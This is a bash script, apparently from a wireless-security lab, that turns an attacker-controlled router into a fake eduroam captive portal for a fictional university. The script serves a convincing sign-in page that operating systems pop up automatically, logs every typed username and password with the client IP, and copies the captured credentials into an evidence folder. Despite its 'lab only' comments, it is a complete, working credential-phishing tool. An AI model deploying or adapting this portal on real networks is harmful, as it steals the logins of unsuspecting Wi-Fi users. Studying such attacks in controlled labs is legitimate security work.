#!/usr/bin/env bash
# Tier 2.5 - captive-portal credential capture on the attacker path (lab only).
#
# Serves a fake "University of Wipkingen" eduroam sign-in form to edu clients and
# logs whatever username/password they type DIRECTLY (no EAP, no cracking). The OS
# captive-detection probe (captive.apple.com / connectivitycheck) hits the :80
# intercept and auto-pops this page as the captive portal.
#
# uni-wipkingen is a FICTIONAL institution (the lab's demo IdP) - this does not
# impersonate a real organisation. Lab only, against your own test device.
#
#   portal.sh on      deploy the login form + CGI capture (turns http-intercept on)
#   portal.sh off     restore the plain non-capturing intercept page
#   portal.sh creds   show captured credentials and copy them into evidence/
#   portal.sh status
#
# Requires an `mango-b` host alias in your ssh config (ProxyJump via mango-a).
set -euo pipefail
MB=${MANGO_B:-mango-b}
SSH=(ssh -o BatchMode=yes "$MB")
HERE="$(cd "$(dirname "$0")" && pwd)"
OUT="evidence/eduroam-attacker"
usage() { echo "usage: $0 on|off|creds|status" >&2; exit 2; }
[ $# -eq 1 ] || usage

case "$1" in
on)
	"${HERE}/http-intercept.sh" on >/dev/null   # ensure the :80 DNAT exists
	"${SSH[@]}" '
		mkdir -p /www-attacker/cgi-bin
		cat > /www-attacker/index.html <<"HTML"
<!doctype html><html><head><meta charset="utf-8"><title>eduroam-lab sign-in</title>
<!-- LAB DEMO: credential-capture portal; uni-wipkingen is fictional -->
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font:16px system-ui,sans-serif;margin:0;background:#f4f5f7;color:#1a1a1a}
.c{max-width:380px;margin:8vh auto;background:#fff;border-radius:12px;padding:28px;box-shadow:0 2px 16px rgba(0,0,0,.08)}
h1{font-size:19px;margin:0 0 4px}p.s{color:#666;font-size:13px;margin:0 0 20px}
label{display:block;font-size:13px;margin:12px 0 4px}input{width:100%;box-sizing:border-box;padding:11px;border:1px solid #ccc;border-radius:7px;font-size:15px}
button{width:100%;margin-top:18px;padding:12px;border:0;border-radius:7px;background:#0b4da2;color:#fff;font-size:15px}</style>
</head><body><div class="c"><h1>University of Wipkingen</h1><p class="s">Sign in to continue on eduroam-lab</p>
<form method="GET" action="/cgi-bin/login">
<label>Username</label><input name="identity" autocapitalize="none" placeholder="user@uni-wipkingen.ch">
<label>Password</label><input name="password" type="password">
<button type="submit">Sign in</button></form></div></body></html>
HTML
		# uhttpd here drops the POST body to CGI; capture via GET QUERY_STRING instead.
		cat > /www-attacker/cgi-bin/login <<"CGI"
#!/bin/sh
printf "%s\t%s\t%s\n" "$(date +%Y-%m-%dT%H:%M:%S)" "${REMOTE_ADDR:-?}" "${QUERY_STRING:-}" >> /tmp/portal-creds.log
printf "Content-Type: text/html\r\n\r\n<!doctype html><meta charset=utf-8><p style=\"font:16px system-ui;margin:12vh auto;max-width:360px;text-align:center\">Connecting to eduroam-lab...</p>"
CGI
		chmod +x /www-attacker/cgi-bin/login
		uci set uhttpd.attacker.cgi_prefix="/cgi-bin"; uci commit uhttpd
		/etc/init.d/uhttpd restart >/dev/null 2>&1
	'
	echo "portal ON: edu HTTP -> fake uni-wipkingen sign-in; typed creds logged to /tmp/portal-creds.log on B."
	;;
off)
	# restore the plain (non-capturing) intercept page, drop the CGI
	"${SSH[@]}" '
		rm -f /www-attacker/cgi-bin/login
		uci -q delete uhttpd.attacker.cgi_prefix || true
		uci commit uhttpd
		/etc/init.d/uhttpd restart >/dev/null 2>&1
	'
	"${HERE}/http-intercept.sh" on >/dev/null   # keeps the plain banner page
	echo "portal OFF: back to the plain non-capturing intercept page (http-intercept still on; run http-intercept.sh off to stop that too)."
	;;
creds)
	mkdir -p "$OUT"
	f="$OUT/portal-creds-$(date +%Y%m%d-%H%M%S).log"
	if "${SSH[@]}" 'test -s /tmp/portal-creds.log'; then
		"${SSH[@]}" 'cat /tmp/portal-creds.log' | tee "$f"
		echo "--- copied to $f ---"
	else
		echo "No portal credentials captured yet (/tmp/portal-creds.log empty)."
	fi
	;;
status)
	"${SSH[@]}" '
		echo "cgi enabled   = $(uci -q get uhttpd.attacker.cgi_prefix || echo no)"
		echo "login form    = $([ -f /www-attacker/cgi-bin/login ] && echo deployed || echo absent)"
		echo "captures      = $(wc -l < /tmp/portal-creds.log 2>/dev/null || echo 0) line(s)"
	'
	;;
*) usage ;;
esac
